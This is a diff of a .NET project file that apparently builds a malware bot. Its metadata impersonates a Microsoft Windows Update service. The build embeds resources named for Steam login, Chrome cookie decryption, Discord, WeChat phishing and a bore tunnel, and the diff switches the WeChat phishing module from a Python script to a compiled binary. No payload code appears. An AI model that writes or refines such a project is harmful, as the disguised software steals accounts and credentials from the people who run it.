@@ -33,6 +33,9 @@
     <Description>Microsoft(R) Management Service for Windows Update</Description>
     <Copyright>(C) Microsoft Corporation. All rights reserved.</Copyright>
     
+    <!-- Match resource prefix used in PhishManager.cs -->
+    <RootNamespace>FinalBot</RootNamespace>
+    
     <DefaultItemExcludes>$(DefaultItemExcludes);scripts\**</DefaultItemExcludes>
     
     <!-- WinForms dependency completely removed for NativeAOT support -->
@@ -49,7 +52,7 @@
     <EmbeddedResource Include="SteamLogin.bin" />
     <EmbeddedResource Include="chromelevator.bin" />
     <EmbeddedResource Include="MsDiscordSvc.bin" />
-    <EmbeddedResource Include="core\wechat_phish.py" />
+    <EmbeddedResource Include="WeChatPhish.bin" />
     <EmbeddedResource Include="websocket\discord_bot.py" />
     <EmbeddedResource Include="bore.bin" />
     <EmbeddedResource Include="e_sqlite3.dll" />
